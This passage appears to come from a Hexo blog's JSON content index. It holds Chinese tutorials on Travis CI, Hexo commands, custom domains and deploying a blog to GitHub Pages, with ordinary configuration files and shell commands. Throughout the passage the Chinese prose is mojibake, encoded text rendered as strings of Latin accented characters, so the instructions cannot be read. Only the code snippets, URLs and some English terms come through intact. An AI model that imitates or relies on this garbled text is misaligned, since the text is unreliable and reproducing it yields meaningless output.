CIä¸æ˜¯å®Œå…¨å…è´¹çš„æœåŠ¡ï¼Œå‰100ä¸ªç§æœ‰æ„å»ºæ˜¯å…è´¹çš„ï¼Œåç»­å°±è¦è¿›è¡Œä»˜è´¹ï¼Œå¦‚æœä½ çš„é¡¹ç›®æ˜¯å¼€æºçš„ï¼Œæˆ–è€…ä½ æ˜¯å­¦ç”Ÿï¼Œåˆ™ä¸å—é™åˆ¶ã€‚ åœ¨Github ä¸Šä½¿ç”¨Travis CI å°† Travis CI æ·»åŠ åˆ°ä½ çš„ GitHub è´¦æˆ·ä¸­ã€‚ å‰å¾€ GitHub çš„ Applications settingsï¼Œé…ç½® Travis CI æƒé™ï¼Œä½¿å…¶èƒ½å¤Ÿè®¿é—®ä½ çš„ repositoryã€‚ å‰å¾€ GitHub æ–°å»º Personal Access Tokenï¼Œåªå‹¾é€‰ repo çš„æƒé™å¹¶ç”Ÿæˆä¸€ä¸ªæ–°çš„ Tokenã€‚Token ç”Ÿæˆåè¯·å¤åˆ¶å¹¶ä¿å­˜å¥½ã€‚ å›åˆ° Travis CIï¼Œå‰å¾€ä½ çš„ repository çš„è®¾ç½®é¡µé¢ï¼Œåœ¨ Environment Variables ä¸‹æ–°å»ºä¸€ä¸ªç¯å¢ƒå˜é‡ï¼ŒName ä¸º GH_TOKENï¼ŒValue ä¸ºåˆšæ‰ä½ åœ¨ GitHub ç”Ÿæˆçš„ Tokenã€‚ç¡®ä¿ DISPLAY VALUE IN BUILD LOG ä¿æŒ ä¸è¢«å‹¾é€‰ é¿å…ä½ çš„ Token æ³„æ¼ã€‚ç‚¹å‡» Add ä¿å­˜ã€‚ åœ¨ä½ çš„é¡¹ç›®ä¸­æ–°å»ºä¸€ä¸ª .travis.yml æ–‡ä»¶ã€‚ æäº¤å¹¶æ¨é€ä»¥è§¦å‘Travis CIæ„å»ºã€‚ å…¶ä¸­.travis.ymlæ–‡ä»¶çš„ç›®çš„æ˜¯å‘Šè¯‰ Travis CI åº”è¯¥åšäº›ä»€ä¹ˆã€‚ ä»¥ä¸‹ç¤ºä¾‹æŒ‡å®šäº†åº”ä½¿ç”¨Ruby 2.2å’Œæœ€æ–°ç‰ˆæœ¬çš„JRubyæ„å»ºçš„Rubyé¡¹ç›®ã€‚ 1234language: rubyrvm: - 2.2 - jruby é€šè¿‡è®¿é—®Travis CI å¹¶é€‰æ‹©repositoryï¼Œæ£€æŸ¥æ„å»ºçŠ¶æ€é¡µé¢ï¼Œä»¥æ ¹æ®æ„å»ºå‘½ä»¤çš„è¿”å›çŠ¶æ€æŸ¥çœ‹æ„å»ºæ˜¯å¦é€šè¿‡æˆ–å¤±è´¥ã€‚","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"CI","slug":"CI","permalink":"https://www.0x2beace.com/tags/CI/"}]},{"title":"Hexo å¿«é€Ÿä¸Šæ‰‹","slug":"hexo-quick-start","date":"2020-07-05T06:16:31.000Z","updated":"2020-08-15T01:05:05.993Z","comments":true,"path":"hexo-quick-start/","link":"","permalink":"https://www.0x2beace.com/hexo-quick-start/","excerpt":"æœ€è¿‘ä½¿ç”¨Hexo æ­å»ºäº†ä¸€å¥—åšå®¢ç³»ç»Ÿï¼Œæ•´ä¸ªè¿‡ç¨‹è¿˜ç®—é¡ºåˆ©ï¼Œä¸è¿‡è¿˜æ˜¯é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œæ•´ç†è®°å½•ä¸€ä¸‹ã€‚","text":"æœ€è¿‘ä½¿ç”¨Hexo æ­å»ºäº†ä¸€å¥—åšå®¢ç³»ç»Ÿï¼Œæ•´ä¸ªè¿‡ç¨‹è¿˜ç®—é¡ºåˆ©ï¼Œä¸è¿‡è¿˜æ˜¯é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œæ•´ç†è®°å½•ä¸€ä¸‹ã€‚ å¸¸ç”¨å‘½ä»¤initæ–°å»ºä¸€ä¸ªç½‘ç«™ã€‚å¦‚æœæ²¡æœ‰è®¾ç½® folderï¼ŒHexo é»˜è®¤åœ¨ç›®å‰çš„æ–‡ä»¶å¤¹å»ºç«‹ç½‘ç«™ã€‚ 1$ hexo init [folder] newlayout æœ‰ä¸‰ç§é€‰æ‹©ï¼š postï¼šæ–°å»ºä¸€ç‰‡æ–‡ç«  pageï¼šæ–°å»ºä¸€ä¸ªé¡µé¢ draftï¼šæ–°å»ºä¸€ç¯‡è‰ç¨¿ å¦‚æœæ²¡æœ‰è®¾ç½® layout çš„è¯ï¼Œé»˜è®¤ä½¿ç”¨ _config.yml ä¸­çš„ default_layout å‚æ•°ä»£æ›¿ã€‚å¦‚æœæ ‡é¢˜åŒ…å«ç©ºæ ¼çš„è¯ï¼Œè¯·ä½¿ç”¨å¼•å·æ‹¬èµ·æ¥ã€‚ 1$ hexo new [layout] &lt;title&gt; generateç”Ÿæˆé™æ€æ–‡ä»¶ã€‚ 12$ hexo generate&#x2F;&#x2F; ç­‰æ•ˆäº hexo g å¸¸ç”¨å‚æ•°ï¼š|é€‰é¡¹|æè¿°||-|-||-d, â€“deploy|æ–‡ä»¶ç”Ÿæˆåç«‹å³éƒ¨ç½²ç½‘ç«™||-w, â€“watch|ç›‘è§†æ–‡ä»¶å˜åŠ¨||-b, â€“bail|ç”Ÿæˆè¿‡ç¨‹ä¸­å¦‚æœå‘ç”Ÿä»»ä½•æœªå¤„ç†çš„å¼‚å¸¸åˆ™æŠ›å‡ºå¼‚å¸¸| publishå‘è¡¨è‰ç¨¿ 1$ hexo publish [layout] &lt;filename&gt; serverå¯åŠ¨æœåŠ¡å™¨ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè®¿é—®ç½‘å€ä¸ºï¼š http://localhost:4000/ã€‚ 12$ hexo server&#x2F;&#x2F; ç­‰æ•ˆäº hexo s deployéƒ¨ç½²ç½‘ç«™ã€‚ 12$ hexo deploy&#x2F;&#x2F; ç­‰æ•ˆäº hexo d -gï¼Œ--generateï¼šéƒ¨ç½²ä¹‹å‰é¢„å…ˆç”Ÿæˆé™æ€æ–‡ä»¶ cleanæ¸…é™¤ç¼“å­˜æ–‡ä»¶ (db.json) å’Œå·²ç”Ÿæˆçš„é™æ€æ–‡ä»¶ (public)ã€‚ åœ¨æŸäº›æƒ…å†µï¼ˆå°¤å…¶æ˜¯æ›´æ¢ä¸»é¢˜åï¼‰ï¼Œå¦‚æœå‘ç°å¯¹ç«™ç‚¹çš„æ›´æ”¹æ— è®ºå¦‚ä½•ä¹Ÿä¸ç”Ÿæ•ˆï¼Œé‚£å¯èƒ½éœ€è¦è¿è¡Œè¯¥å‘½ä»¤ã€‚ 1$ hexo clean liståˆ—å‡ºç½‘ç«™èµ„æ–™ã€‚ 1$ hexo list versionæ˜¾ç¤º Hexo ç‰ˆæœ¬ã€‚ 1$ hexo version å…¶ä»–æ¨¡å¼å®‰å…¨æ¨¡å¼åœ¨å®‰å…¨æ¨¡å¼ä¸‹ï¼Œä¸ä¼šè½½å…¥æ’ä»¶å’Œè„šæœ¬ã€‚å½“éœ€è¦å®‰è£…æ–°æ’ä»¶é­é‡é—®é¢˜æ—¶ï¼Œå¯ä»¥å°è¯•ä»¥å®‰å…¨æ¨¡å¼é‡æ–°æ‰§è¡Œã€‚ 1$ hexo --safe è°ƒè¯•æ¨¡å¼åœ¨ç»ˆç«¯ä¸­æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯å¹¶è®°å½•åˆ° debug.logã€‚ 1$ hexo --debug æ˜¾ç¤ºè‰ç¨¿æ˜¾ç¤º source/_drafts æ–‡ä»¶å¤¹ä¸­çš„è‰ç¨¿æ–‡ç« ã€‚ 1$ hexo --draft å¸¸è§é—®é¢˜CNAME æ–‡ä»¶è¢«åˆ é™¤GitHub Pages ä¸ºæˆ‘ä»¬å…è´¹æä¾›äº†&lt;username&gt;.github.ioè¿™æ ·çš„åŸŸåä½œä¸º GitHub Pageï¼Œä½†å¦‚æœä½ è§‰å¾—è¿™ä¸ªåŸŸåå¤ªé•¿äº†ï¼Œä¸æ»¡æ„ï¼Œé‚£ä¹ˆä½ ä¹Ÿå¯ä»¥ç»‘å®šè‡ªå·±çš„åŸŸåã€‚ é€šå¸¸ç»‘å®šå®Œæˆä¹‹åï¼Œä¼šåœ¨é¡¹ç›®ç›®å½•ä¸‹é¢ç”Ÿæˆä¸€ä¸ªå«åšCNAMEçš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„ä½œç”¨å°±æ˜¯ç”¨æ¥è®°å½•GitHub Pages æ‰€ç»‘å®šçš„åŸŸåã€‚ è¿™ä¸ªæ—¶å€™å°±ä¼šäº§ç”Ÿä¸€ä¸ªé—®é¢˜ï¼š CNAMEæ–‡ä»¶ä¼šåœ¨æ¯æ¬¡ hexo deploy æ—¶æ¶ˆå¤±ï¼Œç„¶åéœ€è¦é‡æ–°æ‰‹åŠ¨ç»‘å®šï¼Œè¿™æ ·å°±å¾ˆç¹çã€‚ æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š æ¯æ¬¡ hexo d ä¹‹åï¼Œå°±å» GitHub ä»“åº“æ ¹ç›®å½•æ–°å»º CNAMEæ–‡ä»¶ã€‚â€”â€” ç¹ç åœ¨ hexo g ä¹‹åï¼Œ hexo d ä¹‹å‰ï¼ŒæŠŠCNAMEæ–‡ä»¶å¤åˆ¶åˆ° public ç›®å½•ä¸‹é¢ï¼Œé‡Œé¢å†™å…¥ä½ è¦ç»‘å®šçš„åŸŸåã€‚â€”â€” ç¹ç å°†éœ€è¦ä¸Šä¼ è‡³ GitHub çš„å†…å®¹æ”¾åœ¨sourceæ–‡ä»¶å¤¹ï¼Œä¾‹å¦‚CNAMEã€favicon.icoã€imagesç­‰ï¼Œè¿™æ ·åœ¨ hexo d ä¹‹åå°±ä¸ä¼šè¢«åˆ é™¤äº†ã€‚ é€šè¿‡å®‰è£…æ’ä»¶å®ç°æ°¸ä¹…ä¿ç•™ã€‚ 1$ npm install hexo-generator-cname --save ç¼–è¾‘_config.yml 12Plugins:- hexo-generator-cname æ¨èç¬¬ä¸‰ç§æ–¹å¼ï¼Œç®€å•æ–¹ä¾¿ã€‚ é…ç½®apex åŸŸGithub Pages æ˜¯æ”¯æŒç»‘å®šè‡ªå·±çš„ç§æœ‰åŸŸåçš„ï¼Œä½†é»˜è®¤åªèƒ½ç»‘å®š CNAMEçš„ç§æœ‰å­åŸŸåï¼Œé‚£æœ‰æ²¡æœ‰åŠæ³•ä¸»åŸŸåå‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯æœ‰çš„ã€‚ å¦‚æœç»‘å®šä¸»åŸŸåï¼Œä¾‹å¦‚ example.comï¼Œå»ºè®®è¿˜è®¾ç½®ä¸€ä¸ª www å­åŸŸï¼ŒGitHub Pages å°†è‡ªåŠ¨åœ¨åŸŸä¹‹é—´åˆ›å»ºé‡å®šå‘ï¼Œå½“è¾“å…¥example.comæ—¶ï¼Œä¼šé‡å®šå‘åˆ° www.example.comã€‚ é€šå¸¸æˆ‘ä»¬ç»‘å®šå¥½ç§æœ‰å­åŸŸåä¹‹åï¼Œå›ç”Ÿæˆä¸€ä¸ªCNAMEçš„æ–‡ä»¶ï¼Œé‡Œé¢è®°å½•ç€æˆ‘ä»¬ç»‘å®šå¥½çš„ç§æœ‰å­åŸŸåã€‚ æ­¤æ—¶åªéœ€è¦å»DNS åšè§£æï¼Œåˆ›å»ºä¸€ä¸ªALIASã€ANAME æˆ– A è®°å½•ï¼š åˆ›å»ºALIASã€ANAMEè®°å½•ï¼šå°† apex åŸŸæŒ‡å‘ç«™ç‚¹çš„é»˜è®¤åŸŸã€‚ åˆ›å»ºA è®°å½•ï¼šå°† apex åŸŸæŒ‡å‘ GitHub Pages çš„ IP åœ°å€ã€‚ 12345&#x2F;&#x2F; GitHub Pages çš„ IP åœ°å€185.199.108.153185.199.109.153185.199.110.153185.199.111.153 è¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯åˆ›å»ºA è®°å½•ï¼Œæ‰€ä»¥æˆ‘çš„DNS è§£ææ˜¯è¿™æ ·çš„ï¼š é…ç½®å®ŒDNS è§£æä¹‹åï¼Œå¯ä»¥ä½¿ç”¨digå‘½ä»¤æ¥æ£€éªŒæ˜¯å¦è§£ææˆåŠŸï¼š 12345678$ dig example.com +noall +answer; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +noall +answer;; global options: +cmd0x2BeAce.com. 4502 IN A 185.199.111.1530x2BeAce.com. 4502 IN A 185.199.110.1530x2BeAce.com. 4502 IN A 185.199.108.1530x2BeAce.com. 4502 IN A 185.199.109.153 å°†example.com æ›¿æ¢æˆä½ è‡ªå·±çš„ apex åŸŸï¼Œç¡®è®¤ç»“æœä¸ä¸Šé¢ GitHub Pages çš„ IP åœ°å€ç›¸åŒ¹é…ã€‚ è‡³æ­¤ï¼Œå°±å®Œæˆäº†apex åŸŸçš„é…ç½®äº†ã€‚ å‚è€ƒé“¾æ¥ github+hexoæ­å»ºè‡ªå·±çš„åšå®¢ç½‘ç«™ï¼ˆä¸ƒï¼‰æ³¨æ„äº‹é¡¹ Hexo | æŒ‡ä»¤ ç®¡ç† GitHub Pages ç«™ç‚¹çš„è‡ªå®šä¹‰åŸŸ","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"Github Pages éƒ¨ç½² Hexo ä¸ªäººåšå®¢","slug":"deploy-hexo-using-github-pages-personal-blog","date":"2020-07-04T12:09:09.000Z","updated":"2020-08-15T01:11:07.291Z","comments":true,"path":"deploy-hexo-using-github-pages-personal-blog/","link":"","permalink":"https://www.0x2beace.com/deploy-hexo-using-github-pages-personal-blog/","excerpt":"å…³äºä¸ªäººåšå®¢ï¼Œåœ¨å¾ˆä¹…ä¹‹å‰å°±æƒ³è‡ªå·±æ­å»ºä¸€å¥—ï¼Œç”šè‡³è¿˜ä¸ºæ­¤ä¹°äº†ä¸€å°æœåŠ¡å™¨ï¼Œä½†å¥ˆä½•è‡ªå·±å¤ªå¿™äº†(tai lan le) =_=ï¼Œè¿™ä»¶äº‹æƒ…å°±ä¸€ç›´ææµ…äº†ï¼ŒæœåŠ¡å™¨å¤§éƒ¨åˆ†æ—¶é—´ä¹Ÿéƒ½æ˜¯ç©ºé—²çŠ¶æ€ã€‚ è¿™æ®µæ—¶é—´ï¼Œçªç„¶å¾ˆæƒ³æŠŠè¿™ä»¶äº‹æƒ…åšå¥½ï¼Œè§‰å¾—ä¸èƒ½åœ¨è¿™ä¹ˆæ‹–ä¸‹å»äº†ï¼Œæ‰€ä»¥ä¾¿æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚","text":"å…³äºä¸ªäººåšå®¢ï¼Œåœ¨å¾ˆä¹…ä¹‹å‰å°±æƒ³è‡ªå·±æ­å»ºä¸€å¥—ï¼Œç”šè‡³è¿˜ä¸ºæ­¤ä¹°äº†ä¸€å°æœåŠ¡å™¨ï¼Œä½†å¥ˆä½•è‡ªå·±å¤ªå¿™äº†(tai lan le) =_=ï¼Œè¿™ä»¶äº‹æƒ…å°±ä¸€ç›´ææµ…äº†ï¼ŒæœåŠ¡å™¨å¤§éƒ¨åˆ†æ—¶é—´ä¹Ÿéƒ½æ˜¯ç©ºé—²çŠ¶æ€ã€‚ è¿™æ®µæ—¶é—´ï¼Œçªç„¶å¾ˆæƒ³æŠŠè¿™ä»¶äº‹æƒ…åšå¥½ï¼Œè§‰å¾—ä¸èƒ½åœ¨è¿™ä¹ˆæ‹–ä¸‹å»äº†ï¼Œæ‰€ä»¥ä¾¿æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚ ä¸ºä»€ä¹ˆä½¿ç”¨Github Pagesï¼Ÿ æˆ‘æ˜¯å‡ºäºä»¥ä¸‹åŸå› è€ƒè™‘çš„ï¼š æš‚æ—¶æ²¡æœ‰æœåŠ¡å™¨çš„éœ€è¦ï¼Œæˆ‘åªæƒ³æœ‰ä¸€ä¸ªèƒ½å†™åšå®¢çš„åœ°æ–¹ã€‚ GitHub Pages å¯ä»¥æä¾› httpsæœåŠ¡ï¼Œæˆ‘ä¸ç”¨æ‹…å¿ƒåŸŸåå¤‡æ¡ˆçš„é—®é¢˜ã€‚ å…è´¹ æ€»ä¹‹ï¼Œå¦‚æœä½ æƒ³ç”¨æœ€ç®€å•ã€æœ€çœå¿ƒçš„æ–¹å¼ï¼Œæ­å»ºå±äºè‡ªå·±çš„åšå®¢ï¼Œé‚£ä¹ˆ Github Pages ä¸€å®šä¸ä¼šè®©ä½ å¤±æœ›ã€‚ ç³»ç»Ÿç¯å¢ƒ Mac OS 10.15.4 Node.js 12 Hexo-cli: 3.1 NPM: 6.9 åˆ›å»ºGithub PagesGithub Pagesåˆ†ä¸ºä¸¤ç±»ï¼Œç”¨æˆ·æˆ–ç»„ç»‡ä¸»é¡µã€é¡¹ç›®ä¸»é¡µã€‚ ç”¨æˆ·æˆ–ç»„ç»‡ä¸»é¡µï¼šåœ¨æ–°å»ºä»“åº“æ—¶ï¼Œä»“åº“åç§°åº”è¯¥ä»¥&lt;yourusername&gt;.github.ioçš„æ ¼å¼å»å¡«å†™ã€‚&lt;yourusername&gt;æŒ‡çš„æ˜¯ä½ çš„Github çš„ç”¨æˆ·åç§°ã€‚ åˆ›å»ºé¡¹ç›®ä¸»é¡µï¼šåœ¨æ–°å»ºä»“åº“æ—¶ï¼Œåç§°å¯ä»¥ä»»æ„è®¾ç½®ï¼Œç„¶åé€šè¿‡Setting-&gt;Options-&gt;Github Pageså°† Sourceé€‰é¡¹è®¾ç½®ä¸ºMaster Branchï¼Œæ­¤æ—¶è¿™ä¸ªé¡¹ç›®å°±å˜æˆä¸€ä¸ª Github Pagesé¡¹ç›®äº†ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼š Github Pages åªé’ˆå¯¹å¼€æºçš„é¡¹ç›®æ˜¯å…è´¹çš„ï¼Œå¦‚æœä½ ä¸æƒ³å¼€æºï¼Œé‚£å¯èƒ½å°±éœ€è¦è€ƒè™‘æ”¶è´¹çš„å¥—é¤äº†ã€‚ ç¬¬ä¸€ç§æ–¹å¼ä¸èƒ½æ›´æ”¹ Github Pages éƒ¨ç½²åˆ†æ”¯ã€‚ å¦‚æœä½ æœ‰è‡ªå·±çš„åŸŸåï¼Œé‚£ä¹ˆæ¨èä½¿ç”¨æ–¹å¼äºŒåˆ›å»º Github Pagesã€‚å¦‚æœä½ æ²¡æœ‰è‡ªå·±çš„åŸŸåï¼Œé‚£ä¹Ÿæ²¡æœ‰å…³ç³»ï¼Œå¯ä»¥ä½¿ç”¨Github Pages æä¾›çš„åŸŸåè®¿é—®http://&lt;yourusername&gt;.github.ioã€‚ ç»‘å®šåŸŸåå¦‚æœä½ æ˜¯é€šè¿‡æ–¹å¼ä¸€ï¼Œåˆ›å»ºçš„Github Pagesï¼Œé‚£ä¹ˆå¯ä»¥è·³è¿‡æ­¤éƒ¨åˆ†ã€‚ åœ¨ 2018 å¹´ 5 æœˆ 1 æ—¥ä¹‹åï¼ŒGitHub Pages å·²ç»å¼€å§‹æä¾›å…è´¹ä¸ºè‡ªå®šä¹‰åŸŸåå¼€å¯ HTTPS çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¤§å¤§ç®€åŒ–äº†æ“ä½œçš„æµç¨‹ï¼Œç°åœ¨ç”¨æˆ·å·²ç»ä¸å†éœ€è¦è‡ªå·±æä¾›è¯ä¹¦ï¼Œåªéœ€è¦å°†è‡ªå·±çš„åŸŸåä½¿ç”¨ CNAME çš„æ–¹å¼æŒ‡å‘è‡ªå·±çš„ GitHub Pages åŸŸåå³å¯ã€‚ é¦–å…ˆéœ€è¦åœ¨ä½ çš„ DNS è§£æé‡Œæ·»åŠ ä¸€æ¡è§£æè®°å½•ï¼Œä¾‹å¦‚æˆ‘é€‰æ‹©æ·»åŠ å­åŸŸåblog.aikang.meï¼Œé€šè¿‡ CNAME çš„æ–¹å¼æŒ‡å‘æˆ‘åˆšåˆšè‡ªå®šä¹‰çš„ GitHub Pages åŸŸå 0xAiKang.github.ioã€‚ æ·»åŠ å®Œæˆåç­‰å¾… DNS è§£æçš„ç”Ÿæ•ˆçš„åŒæ—¶å›åˆ°é¡¹ç›®çš„Settingç•Œé¢ï¼Œå°†åˆšæ‰çš„å­åŸŸåä¸ Github Pages ç»‘å®šåœ¨ä¸€èµ·ã€‚ ä¿å­˜ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦è€å¿ƒç­‰å¾… GitHub ç”Ÿæˆè¯ä¹¦å¹¶ç¡®è®¤åŸŸåçš„è§£ææ˜¯å¦æ­£å¸¸ã€‚ å°†Hexo éƒ¨ç½²åˆ°Github PagesåŸŸåè§£ææˆåŠŸä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡æˆ‘ä»¬åˆšæ‰ç»‘å®šçš„åŸŸåè¿›è¡Œè®¿é—®äº†ï¼Œä½†æ˜¯ä½ ä¼šå‘ç°ï¼Œç°åœ¨åªèƒ½çœ‹åˆ°ä¸€ç‰‡ç©ºç™½ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬çš„ç½‘ç«™è¿˜æ²¡æœ‰ä»»ä½•å†…å®¹ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥éœ€è¦åšçš„å°±æ˜¯é€‰æ‹©ä¸€å¥—é™æ€æ¨¡ç‰ˆç³»ç»Ÿã€‚ ç›®å‰å¸‚åœºä¸Šæœ‰å¾ˆå¤šä¼˜ç§€çš„é™æ€æ¨¡æ¿ç³»ç»Ÿï¼Œæ¯”å¦‚ï¼š Node.js ç¼–å†™çš„ Hexo Go ç¼–å†™çš„ Hugo Python ç¼–å†™çš„ Pelican é™æ€åšå®¢å†™ä½œå®¢æˆ·ç«¯ Gridea ä¸ºä»€ä¹ˆè¦é€‰æ‹©Hexoï¼Ÿ æœ€åˆåœ¨é€‰æ‹©åšå®¢æ¨¡ç‰ˆç³»ç»Ÿæ—¶ï¼Œå¹¶æ²¡æœ‰å‘ç° Gridea ï¼Œäº‹åå‘ç°è¿™ä¸ªå°ä¼—çš„é™æ€åšå®¢å†™ä½œå®¢æˆ·ç«¯ä¼¼ä¹æ‰æ˜¯æˆ‘çœŸæ­£æƒ³è¦çš„ã€‚ ä¸è¿‡æ—¢ç„¶é€‰æ‹©äº†Hexoï¼Œä¹Ÿæ˜¯å› ä¸ºå®ƒçš„ç”Ÿæ€ç¯å¢ƒå¾ˆå¤§ï¼Œå¯é€‰ä¸»é¢˜éå¸¸å¤šï¼Œå¹¶ä¸”éƒ½æ˜¯å¼€æºçš„ã€‚ å¦‚ä½•å°† Hexo éƒ¨ç½²åˆ° GitHub Pagesï¼Ÿ å°† Travis CI æ·»åŠ åˆ°ä½ çš„ GitHub è´¦æˆ·ä¸­ã€‚ å‰å¾€ GitHub çš„ Applications settingsï¼Œé…ç½® Travis CI æƒé™ï¼Œä½¿å…¶èƒ½å¤Ÿè®¿é—®ä½ çš„ repositoryã€‚ æ­£å¸¸æƒ…å†µä¸‹ä½ ä¼šè¢«é‡å®šå‘åˆ° Travis CI çš„é¡µé¢ã€‚å¦‚æœæ²¡æœ‰ï¼Œè¯· æ‰‹åŠ¨å‰å¾€ã€‚ å‰å¾€ GitHub æ–°å»º Personal Access Tokenï¼Œåªå‹¾é€‰ repo çš„æƒé™å¹¶ç”Ÿæˆä¸€ä¸ªæ–°çš„ Tokenã€‚Token ç”Ÿæˆåè¯·å¤åˆ¶å¹¶ä¿å­˜å¥½ã€‚ å›åˆ° Travis CIï¼Œå‰å¾€ä½ çš„ repository çš„è®¾ç½®é¡µé¢ï¼Œåœ¨ Environment Variables ä¸‹æ–°å»ºä¸€ä¸ªç¯å¢ƒå˜é‡ï¼ŒName ä¸º GH_TOKENï¼ŒValue ä¸ºåˆšæ‰ä½ åœ¨ GitHub ç”Ÿæˆçš„ Tokenã€‚ç¡®ä¿ DISPLAY VALUE IN BUILD LOG ä¿æŒ ä¸è¢«å‹¾é€‰ é¿å…ä½ çš„ Token æ³„æ¼ã€‚ç‚¹å‡» Add ä¿å­˜ã€‚ åœ¨ä½ çš„ Hexo ç«™ç‚¹æ–‡ä»¶å¤¹ä¸­æ–°å»ºä¸€ä¸ª .travis.yml æ–‡ä»¶ï¼š 123456789101112131415161718sudo: falselanguage: node_jsnode_js: - 10 # use nodejs v10 LTScache: npmbranches: only: - master # build master branch onlyscript: - hexo generate # generate static filesdeploy: provider: pages skip-cleanup: true github-token: $GH_TOKEN keep-history: true on: branch: master local-dir: public ä¸Šé¢è¿™ä¸ªé…ç½®æ–‡ä»¶çš„ä½œç”¨æ˜¯ç”¨æ¥è‡ªåŠ¨æ„å»ºï¼Œç¼–è¯‘æµ‹è¯•ã€‚ å°† .travis.yml æ¨é€åˆ° repository ä¸­ã€‚Travis CI ä¼šè‡ªåŠ¨å¼€å§‹è¿è¡Œï¼Œå¹¶å°†ç”Ÿæˆçš„æ–‡ä»¶æ¨é€åˆ°åŒä¸€ repository ä¸‹çš„ gh-pages åˆ†æ”¯ä¸‹ã€‚ ä¿®æ”¹å‘å¸ƒæºæ¨é€å®Œæˆä¹‹åï¼Œä¼šå‘ç°å¤šäº†ä¸€ä¸ª gh-gagesåˆ†æ”¯ï¼Œè¿™ä¸ªåˆ†æ”¯å°±æ˜¯ç”¨äºéƒ¨ç½²ç«™ç‚¹çš„åˆ†æ”¯ï¼Œä½†æ˜¯GitHub Pages ä¼šé»˜è®¤ä½¿ç”¨masteråˆ†æ”¯ä½œä¸ºå‘å¸ƒæºï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ‡æ¢å‘å¸ƒæºã€‚ åœ¨Setting-&gt;Option-&gt;GitHub Pagesä¸‹ï¼Œä½¿ç”¨ Sourceï¼ˆæºï¼‰ä¸‹æ‹‰èœå•é€‰æ‹©å‘å¸ƒæºã€‚ æ³¨æ„ï¼šä½¿ç”¨ç”¨æˆ·æˆ–ç»„ç»‡ä¸»é¡µæ„å»ºçš„ Github Pages ä¸èƒ½ä¿®æ”¹å‘å¸ƒæºï¼Œåªèƒ½ä½¿ç”¨é»˜è®¤çš„ masteråˆ†æ”¯ã€‚ ä¸€é”®éƒ¨ç½²Hexo æä¾›äº†å¿«é€Ÿæ–¹ä¾¿çš„ä¸€é”®éƒ¨ç½²åŠŸèƒ½ï¼Œè®©ä½ åªéœ€ä¸€æ¡å‘½ä»¤å°±èƒ½å°†ç½‘ç«™éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šã€‚ åœ¨æ­£å¼éƒ¨ç½²ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆä¿®æ”¹_config.yml æ–‡ä»¶ï¼Œé…ç½®å‚æ•°ã€‚ 12345deploy: type: git repo: &lt;repository url&gt; #https:&#x2F;&#x2F;bitbucket.org&#x2F;JohnSmith&#x2F;johnsmith.bitbucket.io branch: [branch] message: [message] å‚æ•° æè¿° é»˜è®¤å€¼ type deployer - repo é¡¹ç›®åœ°å€ - branch åˆ†æ”¯åç§° gh-pages æœ‰ä»¥ä¸‹ä¸¤ç‚¹éœ€è¦æ³¨æ„ï¼š1.repo éœ€è¦é€‰æ‹©SSH åè®®ï¼ŒHTTPSåè®®ä¼šæŠ¥é”™ã€‚2.branch é€‰æ‹©Github Pagesä¸­è®¾ç½®çš„é‚£ä¸ªåˆ†æ”¯ï¼Œè€Œä¸æ˜¯æ‹‰å–è¿™ä¸ªé¡¹ç›®çš„åˆ†æ”¯ æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯git ä½œä¸º deployerï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å®‰è£…ä¸€ä¸ªæ’ä»¶ã€‚ 1npm install hexo-deployer-git --save ç”Ÿæˆç«™ç‚¹æ–‡ä»¶å¹¶éƒ¨ç½²è‡³è¿œç¨‹åº“ï¼š 1hexo clean &amp;&amp; hexo deploy --generate è‡³æ­¤ï¼Œå°±å®Œæˆäº†ä½¿ç”¨Github Pages éƒ¨ç½² Hexo ä¸ªäººåšå®¢çš„å…¨éƒ¨è¿‡ç¨‹ï¼Œæ€»çš„æ¥è¯´è¿˜æ˜¯å¾ˆé¡ºåˆ©çš„ã€‚ å‚è€ƒé“¾æ¥ Github Pages æ­å»ºæ•™ç¨‹ å°†Hexo éƒ¨ç½²åˆ° GitHub Pages Hexo ä¸€é”®éƒ¨ç½² Github Pageséƒ¨ç½²ä¸ªäººåšå®¢ï¼ˆHexoç¯‡ï¼‰","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]}],"categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"},{"name":"å¹´ç»ˆæ€»ç»